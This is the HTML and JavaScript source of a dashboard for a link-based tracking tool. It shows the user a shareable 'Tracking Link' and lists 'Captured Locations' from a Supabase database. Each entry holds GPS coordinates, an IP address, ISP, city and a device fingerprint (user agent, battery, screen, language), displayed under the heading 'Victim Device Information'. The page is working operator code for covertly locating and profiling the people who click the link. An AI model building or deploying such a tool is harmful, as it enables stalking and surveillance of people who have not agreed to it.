<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Dashboard - Command Center</title><script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script><style>@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');:root{--glow-color:#e94560;--primary-accent:#3498db;--text-light:#e0e0e0;--text-muted:#888}body{font-family:'Poppins',sans-serif;margin:0;transition:background .4s,color .4s;box-sizing:border-box;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;height:100vh;overflow:hidden}*,*:before,*:after{box-sizing:inherit}body.light-mode{background:#11131c;color:#e0e0e0}body.dark-mode{background:#000000;color:var(--text-light)}.container{width:100%;height:100%;padding:25px;display:flex;flex-direction:column;overflow-y:auto}.header{margin-bottom:30px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:15px;flex-shrink:0}h1{font-weight:600;font-size:clamp(1.5rem, 5vw, 1.7rem);margin:0;color:inherit;flex-grow:1}.controls-wrapper{display:flex;align-items:center;gap:15px;flex-shrink:0}.theme-switch{position:relative;display:inline-block;width:60px;height:34px}.theme-switch input{opacity:0;width:0;height:0}.slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#4a4e69;transition:.4s;border-radius:34px}.slider:before{position:absolute;content:"";height:26px;width:26px;left:4px;bottom:4px;background-color:white;transition:.4s;border-radius:50%}input:checked+.slider{background-color:var(--glow-color)}input:checked+.slider:before{transform:translateX(26px)}.slider:before{background-image:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="orange" class="bi bi-sun-fill" viewBox="0 0 16 16"><path d="M8 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/></svg>');background-repeat:no-repeat;background-position:center}input:checked+.slider:before{background-image:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="black" class="bi bi-moon-stars-fill" viewBox="0 0 16 16"><path d="M6 .278a.768.768 0 0 1 .08.858 7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/><path d="M10.794 3.148a.217.217 0 0 1 .412 0l.387 1.162h1.212a.217.217 0 0 1 .134.386l-1.002.725.387 1.162a.217.217 0 0 1-.316.242l-1.001-.725-1.001.725a.217.217 0 0 1-.316-.242l.387-1.162-1.002-.725a.217.217 0 0 1 .134-.386h1.212l.387-1.162zM13.863.099a.145.145 0 0 1 .274 0l.258.774c.115.346.386.617.732.732l.774.258a.145.145 0 0 1 0 .274l-.774.258a.76.76 0 0 0-.732.732l-.258.774a.145.145 0 0 1-.274 0l-.258-.774a.76.76 0 0 0-.732-.732l-.774-.258a.145.145 0 0 1 0-.274l.774.258c.346-.115.617-.386.732-.732L13.863.1z"/></svg>');}#logout-btn{padding:8px 16px;border-radius:8px;font-weight:500;cursor:pointer;transition:all .3s ease;border:1px solid #4a4e69;background:none;color:#aaa;display:flex;align-items:center;gap:8px}#logout-btn:hover{background-color:var(--glow-color);border-color:var(--glow-color);color:#fff}#logout-btn svg{width:16px;height:16px}.link-section{padding:25px;border-radius:12px;margin-bottom:30px;transition:background-color .3s;flex-shrink:0}body.light-mode .link-section{background-color:rgba(22,33,62,.85)}body.dark-mode .link-section{background-color:#1c1c1c}h2{margin-top:0;font-size:1.4rem;color:inherit}#share-link{flex-grow:1;padding:12px;font-size:1rem;white-space:nowrap;overflow-x:auto;background:none;border:none;color:inherit;user-select:text;-webkit-user-select:text;-moz-user-select:text;-ms-user-select:text}.share-link-wrapper{display:flex;align-items:center;gap:10px;padding:4px;border-radius:8px;transition:all .3s ease}body.light-mode .share-link-wrapper{background-color:#0f172a;border:1px solid #4a4e69}body.dark-mode .share-link-wrapper{background-color:#0a0a0c;border:1px solid #383838}#copy-btn{padding:10px;border:none;border-radius:6px;cursor:pointer;transition:all .3s ease;background:none;color:#888}#copy-btn:hover{color:var(--glow-color)}#copy-btn svg{width:20px;height:20px}#copy-btn.copied{color:#2ecc71}.locations-section{margin-top:10px;flex-grow:1;display:flex;flex-direction:column}.locations-section h2{margin-bottom:20px}.locations-grid{display:grid;grid-template-columns:1fr;gap:20px}#message-area{text-align:center;padding:60px 20px;border-radius:12px;margin:auto 0}body.light-mode #message-area{background-color:rgba(22,33,62,.85)}body.dark-mode #message-area{background-color:#1c1c1c}#message-area svg{width:60px;height:60px;margin-bottom:20px;opacity:.5}#message-area h3{margin:0;font-size:1.2rem;font-weight:600}#message-area p{font-size:1rem;opacity:.8}.location-card{border-radius:12px;transition:all .3s ease;overflow:hidden;display:flex;flex-direction:column}body.light-mode .location-card{background:rgba(22,33,62,.85)}body.dark-mode .location-card{background:#1c1c1c}.location-card:hover{transform:translateY(-5px);box-shadow:0 0 25px rgba(233,69,96,0.1)}.card-body{padding:20px;display:grid;grid-template-columns:auto 1fr;gap:10px 15px;align-items:center}.card-body .label{font-size:0.9rem;color:var(--text-muted);font-weight:500}.card-body .value{font-size:0.95rem;font-weight:400;word-break:break-all}.card-actions{margin-top:auto;padding:15px 20px;display:flex;justify-content:space-between;align-items:center;gap:15px}body.light-mode .card-actions{background-color:#0f172a}body.dark-mode .card-actions{background-color:rgba(0,0,0,0.2);border-top:1px solid #383838}.map-link{color:var(--glow-color);text-decoration:none;font-weight:500;display:flex;align-items:center;gap:8px;font-size:0.9rem}.map-link.disabled{color:#888;cursor:not-allowed;opacity:.5}.map-link svg{width:16px;height:16px}.action-btn{padding:8px 18px;font-size:0.9rem;border:none;border-radius:8px;font-weight:500;cursor:pointer;transition:all .3s ease;background:var(--primary-accent);color:white}.action-btn:hover{background:var(--glow-color)}.modal-overlay{display:none;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;overflow:auto;background-color:rgba(0,0,0,.7);justify-content:center;align-items:center;backdrop-filter:blur(5px)}.modal-overlay.active{display:flex}.modal-content{background-color:#1e1e1e;margin:auto;padding:25px;border:1px solid #555;width:90%;max-width:700px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.5);position:relative;animation:slide-in .4s ease-out;color:#e0e0e0;display:flex;flex-direction:column;max-height:90vh}.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;padding-bottom:15px;border-bottom:1px solid #444}.modal-header h3{margin:0;font-size:1.3rem;font-weight:600;color:#fff}.modal-close{color:#aaa;font-size:28px;font-weight:700;cursor:pointer;line-height:1}.modal-close:hover{color:#fff}.modal-body{overflow-y:auto;padding-right:10px}.modal-body .detail-grid{display:grid;grid-template-columns:1fr;gap:10px;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}.modal-body .detail-item{display:grid;grid-template-columns:160px 1fr;align-items:center;background-color:rgba(0,0,0,0.2);padding:12px 15px;border-radius:6px;border-left:3px solid var(--glow-color);transition:background-color .2s}.modal-body .detail-item:hover{background-color:rgba(233,69,96,0.1)}.modal-body .detail-label{font-weight:500;color:#a7a9be;font-size:0.9rem}.modal-body .detail-value{font-weight:400;color:#fff;text-align:left;word-break:break-all;font-size:0.9rem;font-family:monospace}.modal-footer{padding-top:20px;margin-top:auto;border-top:1px solid #444;display:flex;justify-content:flex-end}.copy-intel-btn{padding:8px 18px;font-size:0.9rem;border:1px solid #4a4e69;border-radius:6px;font-weight:500;cursor:pointer;transition:all .3s ease;background-color:transparent;color:#a7a9be}.copy-intel-btn:hover{background-color:#4a4e69;color:#fff}.copy-intel-btn.copied{background-color:#27ae60;border-color:#27ae60;color:#fff;cursor:default}@keyframes slide-in{from{transform:translateY(-50px);opacity:0}to{transform:translateY(0);opacity:1}}</style></head><body><div class="container"><div class="header"><h1>Welcome, <span id="welcome-username"></span>!</h1><div class="controls-wrapper"><label class="theme-switch"><input type="checkbox" id="theme-toggle-checkbox"><span class="slider"></span></label><button id="logout-btn"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16"><path d="M8.5 10c-.276 0-.5-.448-.5-1s.224-1 .5-1 .5.448.5 1-.224 1-.5 1z"/><path d="M10.828.122A.5.5 0 0 1 11 .5V1h.5A1.5 1.5 0 0 1 13 2.5V15h1.5a.5.5 0 0 1 0 1h-13a.5.5 0 0 1 0-1H3V1.5a.5.5 0 0 1 .43-.495l7-1a.5.5 0 0 1 .398.117zM11.5 2H11v13h1V2.5a.5.5 0 0 0-.5-.5zM4 1.5V15h6V1.5l-6 1z"/></svg>Logout</button></div></div><div class="link-section"><h2>Your Tracking Link</h2><div class="share-link-wrapper"><input type="text" id="share-link" value="Generating..." readonly><button id="copy-btn" title="Copy Link"><svg id="copy-icon-normal" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5-.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3z"/></svg><svg id="copy-icon-success" style="display:none;" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16"><path d="M12.736 3.97a.733.733 0 0 1 1.047 0c.286.289.29.756.01 1.05L7.88 12.01a.733.733 0 0 1-1.065.02L3.217 8.384a.757.757 0 0 1 0-1.06.733.733 0 0 1 1.047 0l3.052 3.093 5.4-6.425a.247.247 0 0 1 .02-.022z"/></svg></button></div></div><div class="locations-section"><h2>Captured Locations</h2><div id="message-area" style="display:none;"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16"><path d="M8 16s6-5.686 6-10A6 6 0 0 0 2 6c0 4.314 6 10 6 10zm0-7a3 3 0 1 1 0-6 3 3 0 0 1 0 6z"/></svg><h3>No Locations Captured Yet</h3><p>Share your tracking link to start gathering intelligence.</p></div><div id="locations-grid" class="locations-grid"></div></div></div><div id="intel-modal" class="modal-overlay"><div class="modal-content"><div class="modal-header"><h3>Victim Device Information</h3><span class="modal-close">Ã—</span></div><div class="modal-body"></div></div></div><script>
let supabase;let currentThemeIsDark=false;const loggedInUser=localStorage.getItem('loggedInUser');const welcomeUsername=document.getElementById('welcome-username');const shareLinkInput=document.getElementById('share-link');const copyBtn=document.getElementById('copy-btn');const copyIconNormal=document.getElementById('copy-icon-normal');const copyIconSuccess=document.getElementById('copy-icon-success');const logoutBtn=document.getElementById('logout-btn');const themeToggleCheckbox=document.getElementById('theme-toggle-checkbox');const messageArea=document.getElementById('message-area');const locationsGrid=document.getElementById('locations-grid');const intelModal=document.getElementById('intel-modal');const modalBody=intelModal.querySelector('.modal-body');const allLocationsCache=[];
function setupModal(modalId){const modal=document.getElementById(modalId);const closeBtn=modal.querySelector('.modal-close');closeBtn.onclick=()=>modal.classList.remove('active');window.addEventListener('click',event=>{if(event.target==modal){modal.classList.remove('active')}})}
function applyTheme(isDark){currentThemeIsDark=isDark;themeToggleCheckbox.checked=isDark;document.body.className=isDark?'dark-mode':'light-mode'}
async function toggleTheme(){const newThemeState=!currentThemeIsDark;applyTheme(newThemeState);try{await supabase.from('users').update({is_dark_mode:newThemeState}).eq('username',loggedInUser)}catch(error){console.error('Failed to update theme in DB:',error)}}
function showIntelModal(locationId){const d=allLocationsCache.find(loc=>loc.id==locationId);if(!d)return;const deniedValues=['Permission Denied','Pending...'];const isLocationAvailable=!deniedValues.includes(d.latitude)&&d.latitude!==null;const locationString=isLocationAvailable?`${d.latitude}, ${d.longitude}`:d.latitude||'N/A';const timestamp=new Date(d.created_at).toISOString().replace('Z','+00:00').replace('.000','');const fields=[{label:'Timestamp',value:timestamp},{label:'IpAddress',value:d.ip_address||'N/A'},{label:'City',value:d.city||'N/A'},{label:'Region',value:d.region||'N/A'},{label:'Country',value:d.country||'N/A'},{label:'Location',value:locationString},{label:'Isp',value:d.isp||'N/A'},{label:'Timezone',value:d.timezone||'N/A'},{label:'UserAgent',value:d.user_agent||'N/A'},{label:'Platform',value:d.platform||'N/A'},{label:'Language',value:d.language||'N/A'},{label:'ScreenWidth',value:d.screen_width||null},{label:'ScreenHeight',value:d.screen_height||null},{label:'ColorDepth',value:d.color_depth||null},{label:'PixelDepth',value:d.pixel_depth||null},{label:'BatteryLevel',value:d.battery_level!==null?`${d.battery_level}%`:'N/A'},{label:'IsCharging',value:d.is_charging===null?'N/A':(d.is_charging?1:0)},{label:'CookiesEnabled',value:d.cookies_enabled===null?'N/A':(d.cookies_enabled?1:0)},{label:'DoNotTrack',value:d.do_not_track||'N/A'},{label:'HardwareConcurrency',value:d.hardware_concurrency||'N/A'}];let reportText='';let intelHTML='<div class="detail-grid">';fields.forEach(field=>{reportText+=`${field.label}: ${field.value}\n`;intelHTML+=`<div class="detail-item"><span class="detail-label">${field.label}</span><span class="detail-value">${field.value}</span></div>`});intelHTML+='</div>';const footerHTML='<div class="modal-footer"><button class="copy-intel-btn">Copy Info</button></div>';modalBody.innerHTML=intelHTML+footerHTML;const copyIntelBtn=modalBody.querySelector('.copy-intel-btn');if(copyIntelBtn){copyIntelBtn.addEventListener('click',()=>{navigator.clipboard.writeText(reportText.trim()).then(()=>{copyIntelBtn.textContent='Copied!';copyIntelBtn.classList.add('copied');setTimeout(()=>{copyIntelBtn.textContent='Copy Info';copyIntelBtn.classList.remove('copied')},2000)}).catch(err=>{console.error('Failed to copy info:',err);copyIntelBtn.textContent='Error!'})})}}
function isLocationAvailable(loc){const deniedValues=['Permission Denied','Pending...'];return!deniedValues.includes(loc.latitude)&&loc.latitude!==null}
async function fetchLocations(){messageArea.style.display='none';locationsGrid.innerHTML='';const{data,error}=await supabase.from('locations').select('*').eq('tracked_by_username',loggedInUser).order('created_at',{ascending:!1});if(error){console.error('Error fetching locations:',error);messageArea.textContent=`Error fetching data: ${error.message}`;return}
allLocationsCache.length=0;allLocationsCache.push(...data);if(data&&data.length>0){data.forEach(loc=>{const card=document.createElement('div');card.className='location-card';const capturedDate=new Date(loc.created_at).toLocaleString();const cardBodyHTML=`<div class="card-body"><span class="label">Captured At</span><span class="value">${capturedDate}</span><span class="label">IP Address</span><span class="value">${loc.ip_address||'N/A'}</span><span class="label">City</span><span class="value">${loc.city||'N/A'}</span></div>`;const cardActionsHTML=`<div class="card-actions"><a class="map-link ${!isLocationAvailable(loc)?'disabled':''}" href="${isLocationAvailable(loc)?`https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`:'javascript:void(0)'}" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M8 16s6-5.686 6-10A6 6 0 0 0 2 6c0 4.314 6 10 6 10zm0-7a3 3 0 1 1 0-6 3 3 0 0 1 0 6z"/></svg>View Map</a><button class="action-btn" data-location-id="${loc.id}">Device Info</button></div>`;card.innerHTML=cardBodyHTML+cardActionsHTML;locationsGrid.appendChild(card)})}else{messageArea.style.display='block'}
locationsGrid.querySelectorAll('.action-btn').forEach(btn=>{btn.addEventListener('click',()=>showIntelModal(btn.dataset.locationId))})}

async function displayDashboard(){
    const { data, error } = await supabase.from('users').select('tracker_id, is_dark_mode').eq('username', loggedInUser).single();
    if (error && !data) {
        console.error('User not found in DB, likely purged. Logging out.', error.message);
        localStorage.removeItem('loggedInUser');
        window.location.href = 'login.html';
        return;
    }
    if (data) {
        welcomeUsername.textContent = loggedInUser;
        applyTheme(data.is_dark_mode);
        if (data.tracker_id) {
            const shareableLink = `${window.location.origin}/t/${data.tracker_id}`;
            shareLinkInput.value = shareableLink;
        } else {
            shareLinkInput.value = 'Could not generate link.';
        }
        fetchLocations();
    } else if (error) {
        console.error("An error occurred while fetching user data:", error.message);
        messageArea.innerHTML = '<h3>Could not load data</h3><p>Please check your connection and refresh.</p>';
        messageArea.style.display = 'block';
    }
}

async function initApp(){if(!loggedInUser){window.location.href='login.html';return}try{const response=await fetch('/api/config');const config=await response.json();if(!config.supabaseUrl||!config.supabaseAnonKey)throw new Error("Config not loaded");supabase=window.supabase.createClient(config.supabaseUrl,config.supabaseAnonKey);await displayDashboard();setupModal('intel-modal');themeToggleCheckbox.addEventListener('change',toggleTheme);copyBtn.addEventListener('click',()=>{navigator.clipboard.writeText(shareLinkInput.value).then(()=>{copyIconNormal.style.display='none';copyIconSuccess.style.display='inline';copyBtn.classList.add('copied');setTimeout(()=>{copyIconNormal.style.display='inline';copyIconSuccess.style.display='none';copyBtn.classList.remove('copied')},2000)})});logoutBtn.addEventListener('click',()=>{localStorage.removeItem('loggedInUser');window.location.href='login.html'})}catch(err){console.error("Failed to init app:",err);document.getElementById('message-area').innerHTML='<h3>Initialization Failed</h3><p>Could not connect to the server.</p>'}}
document.addEventListener('DOMContentLoaded',()=>{initApp()});
</script></body></html> 
